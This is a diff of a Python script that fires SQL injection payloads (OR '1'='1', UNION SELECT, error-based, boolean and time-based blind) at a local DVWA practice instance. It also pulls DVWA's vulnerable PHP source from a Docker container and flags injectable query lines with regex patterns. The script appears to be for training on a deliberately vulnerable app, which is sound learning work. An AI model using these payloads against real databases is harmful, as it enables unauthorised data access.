@@ -1,25 +1,30 @@
 import requests
+import subprocess
+import re
 
 # Adjust the URL to point to the correct DVWA path
-url = 'http://127.0.0.1/index.php'
-
-# Replace with your actual session cookies from DVWA
+url = 'http://127.0.0.1/vulnerabilities/sqli/'  # Ensure this URL is correct
 cookies = {
-    'PHPSESSID': "b6sfs6mdktjd2ac9maq44etjq7",  
-    'security': 'low'  # Ensure the security level matches the one set in DVWA
+    'PHPSESSID': 'vf2a0pe10fp2k7pgdsk9jv2270',  # Replace with your actual session cookie
+    'security': 'low'  # Ensure this matches the security level set in DVWA
 }
 
-# List of payloads to test different types of SQL Injection
+# Validate URL and cookies
+if not url or not cookies.get('PHPSESSID'):
+    print("Error: URL or cookies are not properly set.")
+    exit(1)
+
+# List of refined payloads to test different types of SQL Injection
 payloads = {
-    "Classic ' OR '1'='1": "' OR '1'='1",
-    "Union-based": "' UNION SELECT null, database()-- ",
+     "Classic ' OR '1'='1'/*": "' OR '1'='1'/*",
+    "Union-based": "' UNION SELECT NULL, NULL, NULL-- ",
     "Error-based": "' AND 1=CONVERT(int, (SELECT @@version))-- ",
-    "Boolean-based Blind": "' AND 1=1-- ",
-    "Time-based Blind": "' AND SLEEP(5)-- "
+    "Boolean-based Blind": " AND '1'='1'/* ",
+    "Time-based Blind": "' AND SLEEP(5)/*"
 }
 
-# Loop through each payload and test SQL injection
-for name, payload in payloads.items():
+def submit_payload(payload_name, payload):
+    """Submit payloads to the web application and display results."""
     data = {
         'id': payload,
         'Submit': 'Submit'
@@ -28,15 +33,112 @@ for name, payload in payloads.items():
     try:
         response = requests.post(url, cookies=cookies, data=data, timeout=10)
 
-        # Check response content or status code for more detailed analysis
-        if 'User ID exists in the database' in response.text or response.status_code == 200:
-            print(f"SQL Injection successful with {name}: {payload}")
-            print(f"Vulnerability Type: SQL Injection")
+        # Check for specific content that indicates SQL injection success
+        if response.status_code == 200:
+            if any(phrase in response.text.lower() for phrase in [
+                'the used select statements have a different number of columns',
+                'you have an error in your sql syntax',
+                'user id exists in the database',
+                'error']):
+                print(f"SQL Injection successful with {payload_name}: {payload}")
+            else:
+                print(f"SQL Injection unsuccessful with {payload_name}: {payload}")
         else:
-            print(f"SQL Injection unsuccessful with {name}: {payload}")
-            print(f"Vulnerability Type: SQL Injection")
-        
+            print(f"Unexpected status code {response.status_code} with {payload_name}: {payload}")
+
         print("-" * 50)
 
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
+
+def get_container_id():
+    """Retrieve the container ID for the running DVWA container."""
+    try:
+        result = subprocess.run(
+            ["docker", "ps", "--filter", "ancestor=vulnerables/web-dvwa", "--format", "{{.ID}}"],
+            capture_output=True,
+            text=True
+        )
+        container_id = result.stdout.strip()
+        if not container_id:
+            raise ValueError("No DVWA container found.")
+        return container_id
+    except Exception as e:
+        print(f"Error retrieving container ID: {e}")
+        return None
+
+def fetch_php_code(file_path):
+    """Fetch and return the PHP code from the Docker container."""
+    try:
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return ""
+
+        result = subprocess.run(
+            ["docker", "exec", container_id, "cat", file_path],
+            capture_output=True,
+            text=True
+        )
+        return result.stdout
+    except Exception as e:
+        print(f"Error fetching PHP code: {e}")
+        return ""
+
+def extract_vulnerable_code(php_code):
+    """Extract and return all lines containing vulnerable code snippets."""
+    lines = php_code.splitlines()
+    vulnerable_lines = []
+    
+    # Regular expression patterns to identify common SQL injection vulnerabilities
+    patterns = [
+        re.compile(r"\$query\s*=\s*\"SELECT.*FROM.*WHERE.*'\$id';\";", re.MULTILINE),
+        re.compile(r"\$query\s*=\s*\"SELECT.*FROM.*WHERE.*$id;\";", re.MULTILINE),
+        re.compile(r"mysqli_query\s*\(\s*\$GLOBALS\[\"___mysqli_ston\"\],\s*\$query\s*\)", re.MULTILINE),
+        re.compile(r"SQLite3::query\s*\(\s*\$query\s*\)", re.MULTILINE),
+    ]
+    
+    for line in lines:
+        if any(pattern.search(line) for pattern in patterns):
+            vulnerable_lines.append(line)
+    
+    return vulnerable_lines
+
+def main():
+    # Check if URL and cookies are valid
+    if not url or not cookies.get('PHPSESSID'):
+        print("Error: URL or cookies are not properly set.")
+        return
+
+    # Print the security level at the top
+    print(f"Security Level: {cookies.get('security')}\n")
+    
+    # Loop through each payload and test SQL injection
+    for name, payload in payloads.items():
+        print(f"Testing payload: {name}")
+        print(f"Payload used: {payload}")
+        submit_payload(name, payload)
+
+    # Fetch and display the PHP code from low.php
+    low_php_path = '/var/www/html/vulnerabilities/sqli/source/low.php'
+    php_code = fetch_php_code(low_php_path)
+    
+    if not php_code:
+        print("Error: Unable to fetch PHP code.")
+        return
+
+    print("Vulnerable File: /var/www/html/vulnerabilities/sqli/source/low.php")
+    print("--- Vulnerable PHP Code Snippets ---\n")
+    vulnerable_lines = extract_vulnerable_code(php_code)
+    if vulnerable_lines:
+        for line in vulnerable_lines:
+            print(line)
+    else:
+        print("No specific vulnerable code snippets found.")
+    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+    
+    # Add more details about the vulnerability
+    print("The code above is vulnerable because it directly embeds user input into the SQL query without proper escaping or validation. An attacker can manipulate this input to execute arbitrary SQL commands.")
+    
+if __name__ == "__main__":
+    main()
